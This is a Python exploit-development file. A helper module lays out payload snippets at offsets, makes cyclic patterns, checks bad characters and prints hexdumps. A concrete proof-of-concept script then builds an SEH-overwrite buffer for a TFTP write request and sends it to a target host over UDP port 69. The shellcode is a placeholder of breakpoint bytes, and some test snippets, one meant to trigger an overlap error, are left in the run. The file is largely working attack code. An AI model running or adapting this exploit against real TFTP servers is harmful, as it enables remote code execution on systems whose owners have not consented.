#!/usr/bin/env python

'''
Shellcode Helper Canvas Module

This Helper canvas aims to avoid the hassle of having to manually calculate offsets between the differents parts of an exploit payload.
It allows you to define "snippets" (snip) that have the following attributes: offset, content, label and color.
Those snippets can be added to a payload. Once you've added all the desired snippets, you can generate the payload.
The generator will ensure there are no overlapping snippets and allow you to pretty print the generated payload in a colored and tagged hex view.
The initial payload content can either be manually specified or generated with a metasploit compatible cyclic pattern (aka 'De Bruijn Sequence')

Example of payload generation:

    from tsunulukai_pwn_canvas import *

    seh = struct.pack('<I',0xdeadbeef)
    jmpback="\xeb\xea" # jmp short -20
    longjmpback="\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" #jmp eip-512
    sc=brk*350

    p = payload(length=1239)
    # p = payload(nop*1236)
    p.add(snip(1232,seh,"seh",CYEL))
    p.add(snip(1228,jmpback,"jmpback",CRED))
    p.add(snip(1208,longjmpback,"longjmpback",CPUR))
    p.add(snip(194+512,sc,"sc",CGRE))
    p.add(snip(194+600,"AAAAAAAAAAAARGHH","overlaptest",CYEL)) # Will trigger a exception because of overlap
    p.add(snip(672,nop*8,"nop"))      # Autocolor test
    p.add(snip(680,brk*8,"brk"))      # Autocolor test
    p.add(snip(688,"\xff"*8,"ff"))    # Autocolor test
    p.generate()
    p.hexdump()

'''

__description__ = 'Helper canvas to generate exploit payloads; avoids the hassle of having to manually calculate offsets between different parts of the exploit'
__author__      = 'Benjamin Evrard'


# Begin of Helper canvas
import struct
import pwn
import sys
import socket


CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"
nop = "\x90"
brk = "\xcc"


def createPattern(size, args={}):
    char1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    char2="abcdefghijklmnopqrstuvwxyz"
    char3="0123456789"
    if "extended" in args:
        char3 += ",.;+=-_!&()#@({})[]%"
    pattern = []
    max = int(size)
    while len(pattern) < max:
        for ch1 in char1:
            for ch2 in char2:
                for ch3 in char3:
                    if len(pattern) < max:
                        pattern.append(ch1)
                    if len(pattern) < max:
                        pattern.append(ch2)
                    if len(pattern) < max:
                        pattern.append(ch3)
    pattern = "".join(pattern)
    return pattern


class snip:
    def __init__(self, offset, content, label=None, color=CRST):
        self.offset  = offset
        self.content = content
        self.color   = color
        self.label   = label


class payload:
    def __init__(self, content=None, length=4096):
        pa = [""]
        if length > 20280:
            pa.append("extended")
        pattern = createPattern(length, pa)
        self.colormap = []
        if content is not None:
            print("Processing Payload Custom data of length %i" % len(content))
            self.content = content
        else:
            print("Processing Payload Metasploit%s cyclic pattern of length %i" % (" ".join(pa),length))
            self.content = pattern[0:length]
        self.sniplist = []
        self.marksniplist = []
        self.bclist = []
        for i in range(len(self.content)):
            self.colormap.append(CRST)

    def add(self, snip):
        self.sniplist.append(snip)
        self.sniplist = sorted(self.sniplist, key=lambda s: s.offset)

    def mark(self, snip):
        self.marksniplist.append(snip)

    def markbc(self, bc):
        if bc not in self.bclist:
            self.bclist.append(bc)

    def generate(self, bc=""):
        for s in self.sniplist:
            overlap = False
            print("Processing %sSnippet %s at offset %02d of length %s%s" % (s.color, s.label, s.offset, len(s.content), CRST))
            for i in range(s.offset, s.offset+len(s.content)):
                while len(self.colormap) < s.offset+len(s.content):
                    self.content += "A"
                    self.colormap.append(CRST)
                if self.colormap[i] != CRST:
                    self.colormap[i] = BRED + s.color
                    overlap = True
            if overlap == False:
                for i in range(s.offset, s.offset+len(s.content)):
                        self.colormap[i] = s.color
                n=self.content[0:s.offset]
                n+=s.content
                n+=self.content[(s.offset+len(s.content)):]
                self.content = n
            else:
                print("%sError: Overlapping Snippet%s" %(CRED, CRST))
                self.mark(s)
        print("")

        for i in range(len(self.content)):
            if self.colormap[i] == CRST:
              if self.content[i] == nop:
                self.colormap[i] = CCYA
              elif self.content[i] == brk:
                self.colormap[i] = CRED
              elif ord(self.content[i]) in (range(0x30, 0x3A) + range(0x41, 0x5B) + range(0x61, 0x7B)):
                self.colormap[i] = CWHI

            for c in bc:
                if c == self.content[i]:
                    self.colormap[i] += BRED
                    self.markbc(c)


        if self.marksniplist:
            self.hexdump()
            print("%sAborting script execution (overlapping snippets)...%s" % (CRED, CRST))
            sys.exit()

        if self.bclist:
            self.hexdump()
            print("%sAborting script execution (bad chars) ...%s" % (CRED, CRST))
            sys.exit()

    def hexdump(self):
        print(CWHI + "\nBuffer Length: 0x%x (%d)%s" %(len(self.content),len(self.content),CRST))
        hexvalues = ""
        asciivalues = ""
        labels = ""
        for i in range(len(self.content)):
            hexvalues += "%s%02x%s " % (self.colormap[i], ord(self.content[i]), CRST)
            if ord(self.content[i]) in range(0x20, 0x7f):
                asciivalues += "%s%s%s" % (self.colormap[i], self.content[i], CRST)
            else:
                asciivalues += "%s%s%s" % (self.colormap[i], ".", CRST)
            for s in self.sniplist:
                if s.offset == i :
                    labels += "%s%s:%s[%s]%s " % (s.color, s.offset, s.label, len(s.content), CRST)
            if i % 16 == 0x7:
                hexvalues += " "
            if i % 16 == 0xf:
                print("0x%08x (%08d):   %s   %s   %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues, labels))
                hexvalues = ""
                asciivalues = ""
                labels = ""
            elif i == len(self.content)-1:
                if i%16 < 7: hexvalues += " "
                hexvalues += "   " *(15-i%16)
                asciivalues += " " *(15-i%16)
                print("0x%08x (%08d):   %s   %s   %s" % (i & 0xfffffff0, i & 0xfffffff0, hexvalues, asciivalues, labels))

        if self.marksniplist:
            for s in self.marksniplist:
                hexvalues =""
                asciivalues = ""
                for i in range(len(s.content)):
                    hexvalues += "%02x" % (ord(s.content[i]))
                    if ord(s.content[i]) in range(0x20, 0x7f):
                        asciivalues += "%s" % (s.content[i])
                    else:
                        asciivalues += "%s" % (".")
                print("\n%s - /!\ The following snippet was NOT inserted due to overlap with another snippet:\r\n       %s%s%s at offset %s%d%s with content %s '%s' (%s)%s\r\n       ---------------- /!\%s" % (CRED, s.color, s.label, CRED, s.color, s.offset, CRED, s.color, hexvalues, asciivalues, CRED, CRST))
            print("")

        if self.bclist:
            hexvalues =""
            asciivalues = ""
            for c in self.bclist:
                hexvalues += "\\x%02x" % (ord(c))
                if ord(c) in range(0x20, 0x7f):
                    asciivalues += "%s" % (c)
                else:
                    asciivalues += "%s" % (".")
            print("\n%s - /!\ The following BAD CHARS were found in the payload:\r\n       '%s' (%s)%s\r\n       ---------------- /!\%s" % (CRED, hexvalues, asciivalues, CRED, CRST))

        print("")


def ip2int(addr):
    return struct.unpack("!I", socket.inet_aton(addr))[0]


# End of Helper canvas


# Target
host="192.168.1.100"
port=69
tpt="udp"

# Snippets
seh = struct.pack('<I',0x0040484F)  # POP EDI, POP EBP, RET
jmpback="\xeb\xea" # jmp short -20
longjmpback="\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" #jmp eip-512
sc=brk*350

# Buffer
p = payload(nop*1236)
p = payload(length=1239)
p.add(snip(1232,seh,"seh",CYEL))    # SEH handler SEH chain SE handler=31704230; Pattern 0Bp1 (0x31704230) found in cyclic pattern at position 1232
p.add(snip(1228,jmpback,"jmpback",CRED))
p.add(snip(1208,longjmpback,"longjmpback",CPUR))
p.add(snip(194+512,sc,"sc",CGRE))
p.add(snip(194+600,"AAAAAAAAAAAARGHH","overlaptest",CYEL))
p.add(snip(672,nop*8,"nop"))    # Autocolor test
p.add(snip(680,brk*8,"brk"))    # Autocolor test
p.add(snip(688,"\xff"*8,"ff"))    # Autocolor test
p.generate()
buf = p.content


#Build TFTP packet
opcode = "\x00\x02"     # TFTP WRQ
fn     = buf
mode   = "netascii"
null   = "\x00"
req    = opcode + fn + null + mode + null

# The intermediate null byte is now part of the fn (jmpecx)
req = opcode + fn + mode + null

#Connect and send
print("len : " + str(len(req)))
p.hexdump()
c=pwn.connect(host=host,port=port,typ=tpt)
c.send(req)
#print c.recv()
c.close()

